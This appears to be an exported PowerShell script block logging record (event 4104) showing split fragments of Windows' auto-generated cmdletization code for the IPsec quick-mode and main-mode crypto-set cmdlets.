    if ($PSBoundParameters.ContainsKey('GPOSession') -and (@('ByName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetIPsecRule', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('GPOSession', ${GPOSession})
    }
    if ($PSBoundParameters.ContainsKey('TracePolicyStore') -and (@('ByName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetIPsecRule', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('TracePolicyStore', ${TracePolicyStore})
    }


    $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder)
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP NetIPsecQuickModeCryptoSet.cmdletDefinition.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Get-NetIPsecQuickModeCryptoSet' -Alias '*'
        

function Set-NetIPsecQuickModeCryptoSet
{
    [CmdletBinding(SupportsShouldProcess=$true, ConfirmImpact='Medium', PositionalBinding=$false)]
    
    [OutputType([Microsoft.Management.Infrastructure.CimInstance])]
[OutputType('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetIKEQMCryptoSet')]

    param(
    
    [Parameter(ParameterSetName='ByName', Mandatory=$true, Position=0)]
    [Alias('ID')]
    [ValidateNotNull()]
    [string[]]
    ${Name},

    [Parameter(ParameterSetName='ByDisplayName', Mandatory=$true)]
    [ValidateNotNull()]
    [string[]]
    ${DisplayName},

    [Parameter(ParameterSetName='ByDisplayGroup', Mandatory=$true)]
    [ValidateNotNull()]
    [string[]]
    ${DisplayGroup},

    [Parameter(ParameterSetName='ByGroup', Mandatory=$true)]
    [ValidateNotNull()]
    [string[]]
    ${Group},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [string]
    ${PolicyStore},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [string]
    ${GPOSession},

    [Parameter(ParameterSetName='InputObject (cdxml)', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_NetIKEQMCryptoSet')]
    [ValidateNotNull()]
    [ciminstance[]]
    ${InputObject},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [string]
    ${NewDisplayName},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [string]
    ${Description},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [ciminstance[]]
    ${Proposal},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Alias('PfsGroup')]
    [Microsoft.Windows.Firewall.Commands.DiffieHellmanGroup]
    ${PerfectForwardSecrecyGroup},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [switch]
    ${AsJob},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [switch]
    ${PassThru})

    DynamicParam {
        try 
        {
            if (-not $__cmd

ScriptBlock ID: c4a8740d-9bb5-4243-ac04-f86bbefea0d1
Path: "
"07-08-2025 18:31:34","4104","Warning","Creating Scriptblock text (1 of 6):

#requires -version 3.0

try { Microsoft.PowerShell.Core\Set-StrictMode -Off } catch { }

$script:MyModule = $MyInvocation.MyCommand.ScriptBlock.Module

$script:ClassName = 'root/standardcimv2/MSFT_NetIKEQMCryptoSet'
$script:ClassVersion = '1.0.0'
$script:ModuleVersion = '1.0.0.0'
$script:ObjectModelWrapper = [Microsoft.PowerShell.Cmdletization.Cim.CimCmdletAdapter]

$script:PrivateData = [System.Collections.Generic.Dictionary[string,string]]::new()

Microsoft.PowerShell.Core\Export-ModuleMember -Function @()
        

function __cmdletization_BindCommonParameters
{
    param(
        $__cmdletization_objectModelWrapper,
        $myPSBoundParameters
    )       
                

        if ($myPSBoundParameters.ContainsKey('CimSession')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['CimSession'].Value = $myPSBoundParameters['CimSession'] 
        }
                    

        if ($myPSBoundParameters.ContainsKey('ThrottleLimit')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['ThrottleLimit'].Value = $myPSBoundParameters['ThrottleLimit'] 
        }
                    

        if ($myPSBoundParameters.ContainsKey('AsJob')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['AsJob'].Value = $myPSBoundParameters['AsJob'] 
        }
                    

}
                

function New-NetIPsecQuickModeCryptoSet
{
    [CmdletBinding(SupportsShouldProcess=$true, ConfirmImpact='Medium', PositionalBinding=$false)]
    
    
    param(
    
    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [string]
    ${PolicyStore},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [string]
    ${GPOSession},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [Alias('ID')]
    [string]
    ${Name},

    [Parameter(ParameterSetName='cim:CreateInstance0', Mandatory=$true)]
    [string]
    ${DisplayName},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [string]
    ${Description},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [string]
    ${Group},

    [Parameter(ParameterSetName='cim:CreateInstance0', Mandatory=$true)]
    [ciminstance[]]
    ${Proposal},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [Alias('PfsGroup')]
    [Microsoft.Windows.Firewall.Commands.DiffieHellmanGroup]
    ${PerfectForwardSecrecyGroup},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [switch]
    ${Default},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [switch]
    ${AsJob})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
      $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('PolicyStore')) {
          [object]$__cmdletization_value = ${PolicyStore}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:PolicyStore'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:PolicyStore'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('GPOSession')) {
          [object]$__cmdletization_value = ${GPOSession}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:GPOSession'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:GPOSession'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('Name')) {
          [object]$__cmdletization_value = ${Name}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'InstanceID'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'InstanceID'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DisplayName')) {
          [object]$__cmdletization_value = ${DisplayName}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ElementName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ElementName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('Description')) {
          [object]$__cmdletization_value = ${Description}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Description'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Description'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('Group')) {
          [object]$__cmdletization_value = ${Group}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RuleGroup'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RuleGroup'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('Proposal')) {
          [object]$__cmdletization_value = ${Proposal}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Proposals'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Proposals'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('PerfectForwardSecrecyGroup')) {
          [object]$__cmdletization_value = ${PerfectForwardSecrecyGroup}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'PfsGroupID'; ParameterType = 'Microsoft.Windows.Firewall.Commands.DiffieHellmanGroup'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'PfsGroupID'; ParameterType = 'Microsoft.Windows.Firewall.Commands.DiffieHellmanGroup'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('Default')) {
          [object]$__cmdletization_value = ${Default}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:Default'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:Default'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

      $__cmdletization_returnValue = $null
      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('cim:CreateInstance', $__cmdletization_methodParameters, $__cmdletization_returnValue)
      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)

            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP NetIPsecQuickModeCryptoSet.cmdletDefinition.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'New-NetIPsecQuickModeCryptoSet' -Alias '*'
        

function Get-NetIPsecQuickModeCryptoSet
{
    [CmdletBinding(DefaultParameterSetName='GetAll', PositionalBinding=$false)]
    
    [OutputType([Microsoft.Management.Infrastructure.CimInstance])]
[OutputType('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetIKEQMCryptoSet')]

    param(
    
    [Parameter(ParameterSetName='ByName', Mandatory=$true, Position=0)]
    [Alias('ID')]
    [ValidateNotNull()]
    [string[]]
    ${Name},

    [Parameter(ParameterSetName='ByDisplayName', Mandatory=$t

ScriptBlock ID: c4a8740d-9bb5-4243-ac04-f86bbefea0d1
Path: "
"07-08-2025 18:31:34","4104","Warning","Creating Scriptblock text (6 of 6):

        $__cmdletization_values = @(${MaxSessions})
        $__cmdletization_queryBuilder.FilterByProperty('MaxLifetimeSessions', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('ForceDiffieHellman') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${ForceDiffieHellman})
        $__cmdletization_queryBuilder.FilterByProperty('ForceDiffieHellman', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PrimaryStatus') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PrimaryStatus})
        $__cmdletization_queryBuilder.FilterByProperty('PrimaryStatus', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Status') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Status})
        $__cmdletization_queryBuilder.FilterByProperty('Status', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PolicyStoreSource') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PolicyStoreSource})
        $__cmdletization_queryBuilder.FilterByProperty('PolicyStoreSource', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PolicyStoreSourceType') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PolicyStoreSourceType})
        $__cmdletization_queryBuilder.FilterByProperty('PolicyStoreSourceType', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetIPsecMainModeRule') -and (@('ByAssociatedNetIPsecMainModeRule') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetIPsecMainModeRule}, 'MSFT_NetMainModeRuleMMCryptoSet', 'GroupComponent', 'PartComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('All') -and (@('GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('All', ${All})
    }
    if ($PSBoundParameters.ContainsKey('PolicyStore') -and (@('ByName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetIPsecMainModeRule', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('PolicyStore', ${PolicyStore})
    }
    if ($PSBoundParameters.ContainsKey('GPOSession') -and (@('ByName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetIPsecMainModeRule', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('GPOSession', ${GPOSession})
    }
    if ($PSBoundParameters.ContainsKey('TracePolicyStore') -and (@('ByName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetIPsecMainModeRule', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('TracePolicyStore', ${TracePolicyStore})
    }


    $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()
    switch -exact ($PSCmdlet.ParameterSetName) { 
        { @('ByName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetIPsecMainModeRule', 'GetAll', 'InputObject (cdxml)') -contains $_ } {
          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('NewPolicyStore')) {
            [object]$__cmdletization_value = ${NewPolicyStore}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'NewPolicyStore'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'NewPolicyStore'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('NewGPOSession')) {
            [object]$__cmdletization_value = ${NewGPOSession}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'NewGPOSession'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'NewGPOSession'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('NewName')) {
            [object]$__cmdletization_value = ${NewName}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'NewName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'NewName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }
      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('CloneObject', $__cmdletization_methodParameters, $__cmdletization_returnValue)
      $__cmdletization_passThru = $PSBoundParameters.ContainsKey('PassThru') -and $PassThru
            if ($PSBoundParameters.ContainsKey('InputObject')) {
                foreach ($x in $InputObject) { $__cmdletization_objectModelWrapper.ProcessRecord($x, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru) }
            } else {
                $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru)
            }
        }
    }

            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP NetIPsecMainModeCryptoSet.cmdletDefinition.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Copy-NetIPsecMainModeCryptoSet' -Alias '*'
        


ScriptBlock ID: f25ca2f5-ae99-46ae-ade0-bcd1dbfae1dc
Path: "
"07-08-2025 18:31:34","4104","Warning","Creating Scriptblock text (5 of 6):
__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('MaxMinutes') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${MaxMinutes})
        $__cmdletization_queryBuilder.FilterByProperty('MaxLifetimeMinutes', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('MaxSessions') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${MaxSessions})
        $__cmdletization_queryBuilder.FilterByProperty('MaxLifetimeSessions', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('ForceDiffieHellman') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${ForceDiffieHellman})
        $__cmdletization_queryBuilder.FilterByProperty('ForceDiffieHellman', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PrimaryStatus') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PrimaryStatus})
        $__cmdletization_queryBuilder.FilterByProperty('PrimaryStatus', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Status') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Status})
        $__cmdletization_queryBuilder.FilterByProperty('Status', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PolicyStoreSource') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PolicyStoreSource})
        $__cmdletization_queryBuilder.FilterByProperty('PolicyStoreSource', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PolicyStoreSourceType') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PolicyStoreSourceType})
        $__cmdletization_queryBuilder.FilterByProperty('PolicyStoreSourceType', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetIPsecMainModeRule') -and (@('ByAssociatedNetIPsecMainModeRule') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetIPsecMainModeRule}, 'MSFT_NetMainModeRuleMMCryptoSet', 'GroupComponent', 'PartComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('All') -and (@('GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('All', ${All})
    }
    if ($PSBoundParameters.ContainsKey('PolicyStore') -and (@('ByName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetIPsecMainModeRule', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('PolicyStore', ${PolicyStore})
    }
    if ($PSBoundParameters.ContainsKey('GPOSession') -and (@('ByName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetIPsecMainModeRule', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('GPOSession', ${GPOSession})
    }
    if ($PSBoundParameters.ContainsKey('TracePolicyStore') -and (@('ByName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetIPsecMainModeRule', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('TracePolicyStore', ${TracePolicyStore})
    }


    $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()
    switch -exact ($PSCmdlet.ParameterSetName) { 
        { @('ByName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetIPsecMainModeRule', 'GetAll', 'InputObject (cdxml)') -contains $_ } {
          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('NewName')) {
            [object]$__cmdletization_value = ${NewName}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'NewName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'NewName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }
      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('Rename', $__cmdletization_methodParameters, $__cmdletization_returnValue)
      $__cmdletization_passThru = $PSBoundParameters.ContainsKey('PassThru') -and $PassThru
            if ($PSBoundParameters.ContainsKey('InputObject')) {
                foreach ($x in $InputObject) { $__cmdletization_objectModelWrapper.ProcessRecord($x, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru) }
            } else {
